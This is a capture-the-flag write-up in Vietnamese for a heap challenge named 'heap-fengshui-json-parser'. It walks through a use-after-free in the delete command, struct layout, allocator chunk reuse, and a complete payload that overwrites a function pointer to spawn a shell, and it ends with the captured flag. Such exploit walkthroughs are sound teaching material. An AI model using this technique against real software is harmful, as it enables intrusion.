# PWN – heap-fengshui-json-parser

## - Kiểm tra file:

```
$ file ./json_parser
json_parser: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, ..., stripped
```

Kết quả cho thấy đây là file ELF 64-bit, chạy trên Linux. Binary bị strip, nhưng bài có cho kèm source `json_parser.cpp`, nên ta đọc source để tìm bug sẽ nhanh hơn.

## - Chạy thử chương trình

<img width="812" height="587" alt="image" src="https://github.com/user-attachments/assets/41eab3de-ba5b-4425-a1cf-176fb20e5cbd" />


<img width="975" height="221" alt="image" src="https://github.com/user-attachments/assets/1cdf96c3-35fa-4e8c-90c1-4a914ef23988" />

Chương trình nhận các lệnh: `load JSON | del KEY | sample HEXWORDS | symbols | run | reset | quit`

(Ở đây hàm quan trọng là `launch_shell()`. Hàm này sẽ gọi shell nếu tham số truyền vào bắt đầu bằng chuỗi `/bin/sh`.)

-> Vậy mục tiêu của ta là làm sao để chương trình gọi được: `launch_shell("/bin/sh");`


** khi với các dạng bài này (làm nhiều )sẽ nhạy là ta sẽ thấy được ta thử load key "a" nhưng khi xóa ; chạy run mà x vẫn còn( hiện runtime ->x ) thì chắc chắn đây là UAF ; rồi ta sẽ tìm cách ghi đè là được 
<img width="848" height="292" alt="image" src="https://github.com/user-attachments/assets/e2b003b9-60d2-4a4d-9876-da4c4e1778af" />

## - Xem struct trong file cpp


<img width="561" height="331" alt="image" src="https://github.com/user-attachments/assets/c78f5db5-c077-4d73-8685-236eb1fd04e2" />

```cpp
với cách khai báo nên ta biết được 
    unsigned int type;      // +0x00 (4 byte) 
    unsigned int length;    // +0x04 (4 byte) 
    char data[40];          // +0x08 (40 byte) 
    JsonValue *child;       // +0x30 (8 byte) 
    Action action;          // +0x38 
};
```

Ta check chỗ hàm cmd_run và infer_value thấy 
<img width="855" height="378" alt="image" src="https://github.com/user-attachments/assets/c4936cce-2f3c-4be7-b91d-eb011c364dd7" />

<img width="850" height="350" alt="image" src="https://github.com/user-attachments/assets/434fd260-b3b3-4421-9568-6ccbe2887ee9" />

- `action` : hàm sẽ được gọi khi `run`
- Khi chạy lệnh `run`, chương trình sẽ gọi: `v->action(v->data);`

-> Nghĩa là nếu ta điều khiển được `data` và `action`, ta có thể gọi: `launch_shell("/bin/sh");`

## - Bug nằm ở hàm delete (ở hàm free)

<img width="801" height="403" alt="image" src="https://github.com/user-attachments/assets/d2a029c8-e3a0-432d-b458-bbd6f54253db" />


-> chương trình không set lại: `g_model->child = nullptr` (nên `g_model->child` vẫn trỏ vào vùng nhớ đã free) -> Lỗi UAF

## - Xem tiếp allocator tự chế

<img width="681" height="445" alt="image" src="https://github.com/user-attachments/assets/760ea646-a548-43b1-901d-c0400630decd" />


- Khi `del a`, object cũ được đưa vào `g_free_values`
- Sau đó nếu gọi `sample`, chương trình sẽ cấp phát lại đúng chunk vừa bị free
- `sample` cho ta ghi 8 qword, nên ta có thể fake toàn bộ struct `JsonValue`

## - check xem chỗ lệnh sample cho đọc bao nhiêu số để biết còn ghi đè 
<img width="851" height="370" alt="image" src="https://github.com/user-attachments/assets/2a830859-89b0-45e0-b65c-2cea08216792" />
- thấy được lệnh sample đọc 8 số hex :  word[0] word[1] word[2] word[3] word[4] word[5] word[6] word[7]
- Mỗi word là 8 byte nen6n sample cho ghi object giả là 8x8 =64 byte = đúng cá JsonValue 


## - Hướng exploit

1. `load {"a":"x"}`
   -> tạo `g_model->child`
2. `del a`
   -> free `g_model->child` nhưng không xoá con trỏ
3. `sample ...`
   -> lấy lại đúng chunk vừa free và ghi đè struct `JsonValue`
4. `run`
   -> chương trình gọi `fake_action(fake_data)`

Ta cần fake struct như sau:

```
type   = 1
length = 7
data   = "/bin/sh"
child  = 0
action = launch_shell
```

Địa chỉ `launch_shell` lấy được từ lệnh `symbols`:

```
launch_shell = 0x401510
```


## - Tính payload

- `type=1 ; length=7` nằm chung 8 byte đầu
  -> qword: `0x0000000700000001`
- `/bin/sh` sang dạng little endian `"/bin/sh\x00"` (7 byte + 1 byte `\x00`)
  -> `0x0068732f6e69622f`
- `action` -> adr `launch_shell`

=> payload full : `sample 700000001 68732f6e69622f 0 0 0 0 0 401510`

## ket qua local 

kết quả local -> chiếm dc shell 
<img width="1142" height="505" alt="image" src="https://github.com/user-attachments/assets/4b4ea768-d47f-4b54-9068-8aa7cc553d9d" />

## Kết quả  remote
flag{baf2be26-a186-451f-9b86-e296c675abd5}
```
